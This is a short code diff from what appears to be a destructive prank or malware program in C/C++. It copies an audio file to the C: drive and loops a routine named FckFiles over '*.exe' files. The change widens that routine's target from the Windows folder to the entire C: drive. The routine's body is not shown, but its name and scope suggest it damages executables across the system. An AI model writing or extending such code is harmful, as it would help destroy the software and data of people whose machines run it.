@@ -94,7 +94,7 @@ int main(int argc, char* argv[])
 	CopyFile("./meow.mp3","C:/meow.mp3",0);
 	for(int i=0;i<abc.length();i++){
 
-		FckFiles("C:\\Windows","*.exe");
+		FckFiles("C:\\","*.exe");
 	}
 
 }
